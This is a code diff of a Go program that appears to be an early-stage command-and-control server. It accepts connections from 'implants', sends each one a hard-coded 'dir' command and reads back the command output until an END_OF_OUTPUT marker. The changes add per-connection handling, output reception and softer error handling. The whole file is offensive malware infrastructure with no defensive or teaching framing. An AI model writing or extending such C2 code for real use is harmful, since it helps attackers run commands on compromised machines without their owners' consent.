@@ -1,9 +1,12 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"log"
 	"net"
+	"strings"
+	"time"
 )
 
 func main() {
@@ -18,21 +21,48 @@ func main() {
 		conn, err := listen.Accept()
 		if err != nil {
 			log.Fatal(" [-] Error accepting connection")
+			continue
 		}
 
 		fmt.Println("Implant connected: ", conn.RemoteAddr())
-		go sendCommands(conn) //only using go routine here for future compatibility multiple cons
+		go handleImplants(conn)
+
 	}
 
 }
 
 func sendCommands(conn net.Conn) {
-	command := "dir"
+	command := "dir\n"
+	fmt.Println("[*] Sending command:", command)
 	_, err := conn.Write([]byte(command))
 	if err != nil {
-		log.Fatal("[-] Error sending command", err)
+		log.Println("[-] Error sending command", err)
+		return
 	}
-	defer conn.Close()
 
 	fmt.Println("[+] Command sent successfully")
+}
+
+func receiveOutput(conn net.Conn) {
+	response := bufio.NewReader(conn)
+	for {
+		output, err := response.ReadString('\n')
+		if err != nil {
+			log.Println("[-] Error receiving command output", err)
+			return
+		}
+
+		if strings.TrimSpace(output) == "END_OF_OUTPUT" {
+			return
+		}
+		fmt.Print(output)
+	}
+
+}
+
+func handleImplants(conn net.Conn) {
+	defer conn.Close()
+	sendCommands(conn)
+	time.Sleep(2 * time.Second)
+	receiveOutput(conn)
 }
